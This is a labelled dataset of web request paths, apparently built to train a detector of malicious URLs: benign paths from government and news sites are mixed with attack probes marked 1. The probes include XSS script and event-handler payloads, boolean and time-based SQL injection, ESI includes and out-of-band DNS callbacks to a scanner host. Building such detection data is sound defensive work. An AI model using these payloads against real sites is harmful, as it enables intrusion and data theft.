sentences	labels
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) 	 1
/****/system/2016/10/14/012160061.shtml 	 0
/*******/qiye/b-e1580845.html 	 0
/*******/template/jcse/110105008056111/16/images/searchbtn.js 	 1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqswt/ 	 0
/**********/system/2020/06/06/013179312.shtml 	 0
/******/visitcount/visit.jsp?type=2&i_webid=1&i_columnid=' || '' || '4979 	 1
/****/xxgkml/rsrm/202004/t20200421_153185.html 	 0
/****/zfxxgk/fdzdgknr/qtfdxx/zfwj/202112/t20211207_3207578.html 	 0
/**/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 	 1
/**********/system/2021/01/04/javascript:window.print() 	 1
/*/mydevice/loggedout.jsp?locale=""><script>alert(777)</script> 	 1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u68a6\u6b23\u5546\u884c 	 0
/***/lib/lay-module/layuimini/minitab.js?v=1639972889582 	 0
/zwxx_11337/***/202009/t20200903_2215770.html 	 0
/*******/jlcorevalue?id=51' and 2539=7382 and 'uqim'='uqim 	 1
/zwxx_11337/***/201803/t20180314_703287.html 	 0
/****/b-e935090.html 	 0
/**********/system/2021/01/15/013320555.shtml 	 0
/****/bmkx/sajj/201709/t20170909_94707.html 	 0
/**********/system/2020/04/04/013132086.shtml 	 0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u5f20\u5ac2\u917f\u76ae\u9ebb\u8fa3\u70eb\u5e97 	 0
/******/system/2021/09/10/013449439.shtml 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u9a70\u8fdc\u884c\u7535\u52a8\u8f66\u7ecf\u9500\u90e8 	 0
/*****/system/2010/08/01/010170754.shtml 	 0
/****/zfcwhy/201611/t20161108_317013.html 	 0
/zwxx_11337/****/mtjd/202101/t20210115_2571148.html 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)-- &orderby=-docreltime&perpage=15&outlinepage=10 	 1
/****/201909/t20190926_1757115.html 	 0
/**/1.shtml 	 0
/*******/actionhandler/ajax_managed_services.php 	 1
/****/0326/823683.shtml 	 0
/**********/system/2021/12/05/013490088.shtml 	 0
/****/zgsdt/2021_qydt/202111/t20211109_320258.html 	 0
/***/0/00/70/20/702003_015610.jpg 	 0
/******/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx 	 1
/*****/system/2021/03/25/013356729.shtml 	 0
/*******/202112/202112201352591058.html 	 0
/****/20200422/e100071187.html 	 0
/zwxx_11337/****/201907/t20190725_1627765.html 	 0
/****/zzxxgk/jjhzj/zsxw/202004/t20200424_165793.html 	 0
/****/gjjj/201903/t20190328_206038.html 	 0
/*****/system/2014/09/07/011501834.shtml 	 0
/xxgk'""()&%<acx><script >04kx(9553)</script>/******/list.html 	 1
/zwxx_11337/****/ytdd/202111/w020211130562177249846.jpg 	 0
/jsearchfront<esi:include src=""http://*******/rpb.png""/>/template/jcse/110105008056111/16/images/plugin/voice/hzrecorder.js 	 1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7f8e\u52a0\u4e50\u6d17\u6d74\u4e2d\u5fc3 	 0
/****/system/2009/06/04/002750674.shtml 	 0
/****/js.aspx 	 1
/****/zfcwhy/201611/t20161110_317042.html 	 0
/**/system/2012/12/10/010974875.shtml 	 0
/****/zxft/202004/">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a> 	 0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u805a\u91d1\u9601\u670d\u88c5\u5e97 	 0
/****/category/yidaiyiluzhuanti?page=1' or 1282=1282 /* 	 1
/****/bmkx/sgsj/202112/t20211220_197994.html 	 0
/***/0/01/36/24/1362402_996778.jpg 	 0
/***/js/top.js 	 0
/***/wxzcgk/201801/t20180115_669577.html 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5b9c\u54c1\u67dc\u95e8\u52a0\u5de5\u90e8 	 0
/***/blockdata/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=minqing 	 0
/**************/newscenter/system/2021/12/20/013497383.shtml 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6da6\u6c47\u548c\u7f51\u7edc\u79d1\u6280\u6709\u9650\u516c\u53f8 	 0
/******/list_160_1.html 	 0
/****/201909/t20190926_1757223.html 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4e2d\u6d77\u4f1a\u52a1\u670d\u52a1\u4e2d\u5fc3(\u6709\u9650\u516c\u53f8) 	 0
/hire_prd/*****/static/css/app.cf0e3b8f9aa52f651d25c7228f6c02cf.css 	 0
/jsearchfront"" and 2*3*8=6*8 and ""ezrm""=""ezrm/********/jcse/110105008056111/16/images/ui.css 	 1
/****/czgk/bmjs/zzqjcyxt/xxqrmjcy/201908/t20190808_1655613.html 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5fb7\u4e4b\u54c1\u5305\u88c5\u6709\u9650\u516c\u53f8 	 0
/****/gfxwj/201901/t20190102_1240065.html 	 0
/zwxx_11337/****/zcjd/\"javascript:void(0)\" 	 1
/***/user/gallery1.php?g_name=<script>alert(77729</script> 	 1
/****/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='"><script>alert(77729;</script> 	 1
/*******/zwgk/czgk/bmyjs/zzqrdcwh/zzqrdcwhbgt/ 	 0
/**/images/reset.css 	 0
/****/qtgz/202009/t20200928_254070.html' and 'x'='y 	 1
/**/ui/lib%' and 2*3*8=6*8 and '55bm'!='55bm%/jquery/jquery.min.js 	 1
/****/czgk/bmjs/zzqfyxt/szsszjrmfy/index_1.html 	 0
/****/jsly/lsxxcyzb/201610/t20161014_103599.html' and 'x'='y 	 1
/***/blockdata/getbreadcrumbnavigation.do?callback=jquery111303874501474133224_1640008822491&channel_id=&callback=createcrumbs 	 0
/****/gjdjbn/djbn_jthd/202106/t20210626_294435.html 	 0
/****/mtgz/2021_mtgz%' and 2*3*8=6*8 and 'r6zj'!='r6zj%/202103/t20210314_271326.html 	 1
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/********/js/image/imagescroll.js 	 1
/******/usercenter/index?qrcode=quicklyrq,3,41543,10322054 	 0
/zwxx_11337/****/mtjd/201901/t20190117_1253971.html 	 0
/****/system/2021/03/08/013347129.shtml 	 0
/****/zzxxgk/bmfpb/xxgkml/nynczcjd/list.html 	 0
/****/bwcx/dtbb/jcdt/index_2.html 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtejjdraqzph9xg9wprt1q3u=&openid=ovl7jjin6tueysitgqzwfzp9fcd0&outer_str=13654&activate_ticket=fdzv9emqaffrnr3xboqhb03nc8yltorp6k7iuxwdqcvoo8dbj5 fzedtzplsmcaris3hq0csxvvk6sl kk23yn2dzvqtgiq45lbxw/tfgli= 	 0
/****/wdszs/hfsz/202007/t20200722_169652.html 	 0
/****/ 	 0
/**********/system/2020/01/01/013047650.shtml 	 0
/*******/b8dzr.php 	 1
/****/zt/yqfkzccs/sjzccs/202109/t20210923_3043270.html 	 0
/****/web/search?&channelid=234439&searchword=\u529f\u80fd\u7f3a\u635f&keyword=\u529f\u80fd\u7f3a\u635f 	 0
/*****/system/2015/09/07/011813557.shtml 	 0
/**/ui/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/page.css 	 1
/**/system/2006/10/17/000011608.shtml 	 0
/****/qzfwj/201911/w020211011378086310292.ofd 	 0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdshc4&l=\ufffd\ufffd\ufffd 	 0
/******/download/downfile.jsp?classid=0') and 4607=5065 and ('ktnf'='ktnf&filename=1b0848360b3c411a9c69b356cf0165e0.doc 	 1
/****/\ufffd\u0576\ufffd\ufffd\ufffd 	 0
/****/bmkx/sgsj/202106/w020210628632206683703.jpg 	 0
/*******/wmx7fv.php 	 1
/*******/jcms/interface/jtree.jsp?type=2&webid=1&password=*&userid=admin' and '1'='1 	 1
/**************/ 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9526\u9e9f\u767e\u8d27\u5e97 	 0
/****/czgk/bmyjs/qtdw/zzqhtglzx/201712/t20171211_633526.html 	 0
/****/zfwjn/1088/1105/list<esi:include src=""http://bxss.me/rpb.png""/>.html 	 1
/***/003/004/154/00300415413_9eefffd7.jpg 	 0
/****/qzfwj/201801/t20180115_668802.html/index_1.html 	 0
/****/mswpmm/common/newaccount.aspx?ddlculture=alert(777) 	 1
/****/zhengce/zfwjn/202112/t20211206_197380.html 	 0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u4e50\u5929\u5546\u5e97 	 0
/***/interface/comul_total.json.jsp?callback=jquery171047500679874792695_1640037331831 	 0
/******/resource/storage/localupload.jsp?doaction=save and 7122=0473--&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798 	 1
/*******/qiye/home-e37881.html 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4f59\u4e3d\u6876\u88c5\u6c34\u5e97 	 0
/****/zjdt/rsyjgdw/zcwj/5.htm 	 1
/********/ywly/kjyf/kjcx/xyfw/wzdt/gygj/yqlj/images/css.css 	 0
/****/zgsdt/2014zgsdt/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u65af\u6d3e\u6d1b\u6559\u80b2\u79d1\u6280\u6709\u9650\u516c\u53f8 	 0
/****/czgk/czyjs/202105/p020210526565814697661.pdf 	 0
/***********/jinrongqihuo/0""xor(if(now()=sysdate(),sleep(28),0))xor""z/ 	 1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u9177\u8dd1\u8f66\u4e1a 	 0
/*****/gy42/cpgyss.asp?key=mobil al&l2=\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u00bd\ufffd 	 0
/*/210909-2/bxss.me/t/xss.html? 	 1
/**/system/2007/08/03/002172541.shtml 	 0
/****/bysw/201907/t20190704_139319.html?leader=惠　强<esi:include src=""http://bxss.me/rpb.png""/> 	 1
/***/col49/index.html"" and ""x""=""y 	 1
/****/gjsjd/sjdjj/ 	 0
/***********/shangpinqihuo/nengyuanhuagong/javascript:void(0) 	 1
/****/20200620/e102534685.html 	 0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqskylgbjdaj_1819/index_1.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6069\u548c\u9547\u9a6c\u8bb0\u51c9\u76ae\u9ebb\u8fa3\u70eb\u5e97 	 0
/****/web/search/search?page=3&channelid=287219 and 5067=5067-- vkoy&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
/******/system/2021/03/13/javascript:void(0); 	 1
/****/bmkx/snmj/202003/w020200312341080878423.png 	 0
/*******/qiye/e142933438.html 	 0
/***/003/003/685/00300368555_4d1533ce.png 	 0
/****************/notification/negotiate?access_token=138a6cf9-9467-4dd2-8977-366c3cca8fd0 	 0
/*******/o9xda.php 	 1
/**********/system/2020/07/12/013203873.shtml 	 0
/*****/rwby/201907/t20190719_140066.html 	 0
/**********/system/2021/12/03/013489727.shtml 	 0
/**/hero_os/search?q="" onmouseover=alert(777) ="" 	 1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u73ae\u5a1f\u5546\u884c 	 0
/****/web/search?searchword=1' or 9342=3547  	 1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b8f\u7965\u957f\u76db\u5546\u8d38\u6709\u9650\u516c\u53f8 	 0
/**********/system/2021/06/30/013410779.shtml 	 0
/****/zbyfyzz/cpyz/201412/w020141226596038835396.jpg 	 0
/**/system/2021/08/08/012189899.shtml and 1=1 	 1
/******/nav_line.png 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5149\u5408\u773c\u955c\u5e97\u4e07\u8fbe\u5e97 	 0
/*********/treasury/index.aspx?nodeid=394 and 5949=5949 	 1
/****/gfxwj/201912/t20191224_1901194.html 	 0
/******/bootstrap_zwfw.css 	 0
/*****/gjcp/hbsb/gygj/jtgg/dsh/xwzx/xydt/xxgk/qyzdsx/ywly/zbyfyzz/ 	 0
/****/xxgknb/2018/bmnb2018/201903/w020190312329317389936.jpg 	 0
/****/ad_js.php?aid=7&c=assert 	 1
/****/zfwjn/1088/1094/list.html?new=0.42120017961088885<esi:include src=""http://bxss.me/rpb.png""/> 	 1
/****/rwfc/202011/t20201125_256652.html' and 'x'='x 	 1
/******/usercenter/index?qrcode=scanqrcode&code=061ooq000s5fzm1smn200jbhkd0ooq0m 	 0
/***/lti/auth.php?redirect_uri=javascript:alert('22xwqrrtdaqkvwuztgwp4v1psdp') 	 1
/****/tips/tipsloginsubmit.action 	 1
/*****/gy48/cpgyss.asp?key=\ufffd\u073d\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/***/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
/***/0/01/90/12/1901260_896927.jpg 	 0
/**********/system/2014/06/13/011424563_02.shtml 	 1
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqslt 	 0
/****/czgk/bmyjs/qtdw/aglyzhaggclhhy/ 	 0
/*****/classifier,ruleset.jsp?action_flag=&page=1&kw="/><script>alert(777)</script>&id=&domain=&keyword=&points= 	 1
/**********/system/more/213000000000000/0001/213000000000000_00000178.shtml 	 0
/***/nbhd/opengovmsgbox.do?method=countgovmsgboxs&siteid=115&appid=4&begintime=2021-12-20 00:00:00&endtime=2021-12-20 12:04:57 	 0
socket.gethostbyname('hitev' 'xkxdbuxrc4723.bxss.me.')[3].to_s) '/*******/css/jpage.css 	 1
/****/myyfw/jdcp/201411/w020150209642875106860.jpg 	 0
/***/nbhd/opengovmsgbox.do?method=listgovmsgboxs&siteid=115&appid=4&pageindex=1&pagesize=15 	 0
/****/tzgg/2011tzgg/201412/t20141218_40466.html 	 0
/*******/qiye/b-e1775005.html 	 0
/******/system/2020/04/03/013131362.shtml 	 0
/**/news/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
/*****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- 	 1
/zwxx_11337/****/201911/t20191127_1864978.html 	 0
/****/bmkx/sybj/index.html 	 0
/****/whs/yw_1286/202010/t20201023_2265572.html 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4e94\u70b9\u79d1\u6280\u6709\u9650\u516c\u53f8 	 0
/*******/images/videoshow.js 	 0
/****/web/search?channelid=222832&searchword=\u5f20\u5c0f\u4e91 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtgpll bwdrx9yohvpmabmfo=&openid=ovl7jjrwt8vvcopgatjtoa6cbnfo&outer_str=quicklyrq,3,56109,849547&activate_ticket=fdzv9emqaffrnr3xboqhb7tplguuorltagn13v8xou3oo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi/jmcy251ej385dv/farzwc= 	 0
/******/dian2.png 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9732\u9732\u670d\u9970\u644a\u70b9 	 0
/**********/system/2021/08/06/013431542.shtml 	 0
/zwxx_11337/****/index_22.html 	 0
/****/czgk/bmjs/zzqjcyxt/hgzdqrmjcy/201808/w020180816407241682665.ceb 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/tjxx/pcsj/list.html?new=/xfs.bxss.me 	 1
/*******/zwgk/czgk/bmjs/zzqzfzcbmyzstsjg/zzqzfhcxjst/ 	 0
/****/zzxxgk/wsjkwyh/xxgk_3565/?id=3731 	 0
/*******/qiye/b-e791991.html 	 0
/***/js/cost/expense_bxreimbursements.js 	 0
/****************/notification/negotiate?access_token=983988b9-bef1-4427-ada1-78099b396ac4 	 0
/****/czgk/bmjs/zzqjcyxt/xqqrmjcy/201808/t20180816_977443.html 	 0
/****/1225/812401.shtml 	 0
/****/pucghtmain/pucghtinfolist.z 	 0
/****/zxta/202112/t20211208_3210169.html 	 0
/**********/system/2021/09/02/013444674.shtml 	 0
/******/public/2021/04/15/104898.images/v104898_b1618449262682_app.jpg 	 0
/****/http://bxss.me/t/fit.txt/202107/t20210723_2938511.html 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u897f\u9047\u5357\u7ca4\u7802\u9505\u7ca5\u5e97 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(6246)">?_=1630312264714 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8bfa\u5b9d\u5b66\u751f\u6821\u5916\u5c31\u9910\u70b9 	 0
/***/interface/comul_total.json.jsp?callback=jquery111105095995120713646_1639980320200 	 0
/***/003/004/144/00300414412_1dc5af0a.jpg 	 0
/**************/bv/ 	 0
/****/bmkx/jyj/202012/t20201208_174720.html 	 0
/***/0/01/64/43/1644348_760963.gif 	 0
/*******/qiye/b-e2033261.html 	 0
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=jujiao¤tpage=2&query=java 	 0
/******/system/2016/09/18/012133791.shtml 	 0
/****/zjdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/gzdt/145.htm 	 1
/************/interfaces/spellcheck.do?0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 1
/****/js/lib/jquery.js?3422345= style=background:expression(alert(1916)) 	 1
/**********/system/2020/03/27/013126623.shtml 	 0
/****/xqdt/pcq/index_4.html 	 0
/*******/zwgk/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqrfb/ 	 0
/****/crt/ldyl/ 	 0
/************/template/jcse/110105008056111/16/images/http://bxss.me/t/fit.txt?.jpg/selectpick/js.js 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u91d1\u8272\u9ea6\u7530\u5de5\u4f5c\u5ba4 	 0
/****/web/search?channelid=222832&searchword=\u7a46\u8428\u98df\u54c1(\u6df1\u5733)\u6709\u9650\u516c\u53f8\u5b81\u590f\u76d0\u6c60\u5206\u516c\u53f8 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u878d\u548c\u5802\u7f8e\u5bb9\u517b\u751f\u9986 	 0
/*****/ifnmw/u1siuf.shtml 	 0
/***/0/02/06/43/2064336_178749.jpg 	 0
/****/zgsdt/zgs16/201609/t20160901_98402.html 	 0
/****/openemr/?site="">alert(777); 	 1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u05e9\ufffd\ufffd&l=\u0328\ufffd\ufffd 	 0
/****/tzgg/201104/t20110425_319052.html 	 0
/****/index/hy/ 	 0
/***/0/01/56/10/1561011_742285.jpg 	 0
/****/js/if(now()=sysdate(),sleep(15),0)/jsencrypt.min.js 	 1
/***/advert?data={"ad_type":5,"channel_type":4,"channel_id":12500,"place_id":"fm_sp_ard","news_id":"896482"} 	 0
/*****/system/2014/11/09/011550340.shtml 	 0
/****/web/search?page=3&channelid=220579&searchword='\u6316\u6398\u673a'&keyword='\u6316\u6398\u673a'&orderby=-docreltime&perpage=15&outlinepage=10 	 0
/****/xxgkml/qtfdxx/zcjd/qwjd/list_10.html 	 0
/****/czgk/bmjs/zzqjcyxt/szssrmjcy/\"javascript:void(0)\" 	 1
/****/gjzqq/index.html?continent=-1) or 0721=5728# 	 1
/****/scripts/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) 	 1
/***/interface/comul_total.json.jsp?callback=jquery111105763433947808843_1640025377960 	 0
/****/system/2020/04/21/013145731.shtml 	 0
/***/main/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 1
/****/zt/zfgzbg_1537/201902/t20190203_1275663.html 	 0
/****/spjj/201707/t20170714_271118.html 	 0
/***/viewspace-514.html 	 0
/****/gw_admin.php?a="">alert(777);&t=settings 	 1
/**/genixcms-master/genixcms-master/gxadmin/index.php?page=posts&q=1'alert(777) 	 1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u8001\u5927\u70e7\u70e4\u5e97 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(3550)">?_=1630311944810 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_"".gethostbyname(lc(""hitxg"".""yvmgzhxde8052.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(86).chr(111).chr(81).""/list.html 	 1
/****//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 1
/****/byszx/201611/t20161121_76519.html?leader=bxss.me/t/xss.html? 	 1
/**/system/2021/10/26/012211708.shtml 	 0
/****/lt/spbd 	 0
/****/gfxwj/201912/w020211011361506954408.ofd 	 0
/**********/system/2012/06/01/010785583.shtml 	 1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u674e\u6587\u5bcc\u8d27\u7269\u8fd0\u8f93\u90e8 	 0
/****/lj_46507/yw_1295/202112/t20211201_3175760.html 	 0
/****/zdlygk/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/zws/yzq/xmb_gzdxb.htm 	 1
/****/zhengce/zfwjn/201802/p020211112411403573730.pdf 	 0
/****/gjjtsrkzcxzyhd/hddt/201412/t20141218_49235.html 	 0
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/czjs/gzdt.htm 	 1
/****/web/search?page=150&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10 	 0
socket.gethostbyname('hitff' 'iesrojzg9ea56.bxss.me.')[3].to_s) '/******/jquery.cookie.js 	 1
/**********/system/2019/11/27/013025275.shtml 	 1
/*************/ztsj/zt/hjbhdc/202112/t20211219_3234988.html 	 0
/zwxx_11337/***/202109/t20210904_3005229.html 	 0
/***/2021<esi:include src=""http://bxss.me/rpb.png""/>/10/11/art_34_242319.html 	 1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u013e\ufffd\ufffd\u0479\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd 	 0
/***/0/00/64/38/643804_847736.jpg 	 0
/****/dqgz/index_6.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u6cf0\u7801\u670d\u88c5\u5e97 	 0
/******/image/ 	 1
/**/gw_admin.php?a="">alert(777);&t=settings 	 1
/****/zfgb/2018/201805/p020180531408292386969.pdf 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u51e4\u5de2\u5a5a\u5e86\u6709\u9650\u516c\u53f8 	 0
/*/210719/index/ 	 1
/****/web/search/search?page=3&channelid=287219&searchword=1);select pg_sleep(5)--&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
/***/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 1
/****/bmkx/ygjt/201812/t20181227_112828.html 	 0
/****/bmkx/sfgw/202101/w020210127551019717679.png 	 0
/xxgk' and 2*3*8=6*8 and '91xc'='91xc/*******/ybjsqzn/list.html 	 1
/*****/abantecart/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> 	 1
/*******/qiye/knp3xn_23_e144522988.html 	 0
/****/qzfwj/5620/5644/index_1.html 	 0
/****/zfwjn/1079/1081/list.html?new="".gethostbyname(lc(""hitzr"".""dcxjgghfe44fd.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(83).chr(110).chr(90)."" 	 1
/***/index.php?show_record_links=1&table=products"">alert(777);&add_new_item=1 	 1
/**********/system/2021/12/12/013493311.shtml 	 0
/****/20210401/9636.html 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u7ea2\u78e1\u4f11\u95f2\u5c4b 	 0
/****/tzgg/2014tzgg/201501/images/header_phone.jpg 	 0
/*****/ 	 0
/****/zdlygk/ncwywfgz/wzs/qtxs/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
/***/2021/10/12/art'||'_32_242398.html 	 1
/****/ls4tmj-syxw-e110559222.html 	 0
/zwxx_11337/****/202004/t20200410_2018254.html 	 0
/****/mtgz/0'xor(if(now()=sysdate(),sleep(15),0))xor'z_mtgz/202103/t20210314_271326.html 	 1
/****/qtgz/202109/ 	 1
/***************/cpsms/20210726/10179.html 	 0
/****/gfxwj/201911/">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a> 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4e07\u90a6\u6587\u5316\u4f20\u5a92\u6709\u9650\u516c\u53f8 	 0
/************/search.do?begin=20201012&end=20211012&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=1&tpl=16&websiteid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z 	 1
/*******/g8g.php 	 1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
/****/gjzqq/nmz/bl/201412/w020141225520369433700.png 	 0
/******/system/2021/09/10/javascript:void(0); 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(906)</script>?_=1630311655553 	 1
/****/xxgkzn/bxss.me.html 	 1
/****/zt/msss/msxw/201902/t20190219_1283504.html 	 0
